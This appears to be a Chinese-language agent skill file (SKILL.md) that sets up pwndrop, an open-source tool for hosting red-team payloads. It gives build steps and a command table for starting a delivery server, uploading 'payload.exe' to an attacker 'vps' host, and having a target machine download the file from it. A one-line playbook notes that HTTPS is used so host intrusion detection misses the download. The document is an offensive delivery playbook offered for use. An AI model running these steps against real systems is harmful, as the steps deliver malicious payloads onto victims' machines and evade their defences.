---
name: pwndrop-file-drop
description: pwndrop: 红队载荷托管。信号:载荷开发,武器化,启动投递服务,上传,目标机下载。
---

# pwndrop

- 攻击大类:C07 载荷与文件投递
- 上游仓库:https://github.com/kgretzky/pwndrop
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/kgretzky/pwndrop && cd pwndrop && make
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./pwndrop -s 0.0.0.0:443 -d files/` | 启动投递服务 |
| `curl -F 'file=@payload.exe' https://vps:443/upload` | 上传 |
| `curl -L -o file 'https://vps:443/shared/file'` | 目标机下载 |
| `--no-web` | 纯 CLI |

## 攻击场景 Playbook

### 红队载荷托管

```bash
./pwndrop -s 0.0.0.0:443
# 目标机 curl/Invoke-WebRequest 拉载荷,HTTPS 防 HIDS 特征
```

## 注意事项

kgretzky 出品的自托管文件投递服务,Web 管理+短链+HTTPS,替代临时 python http.server。
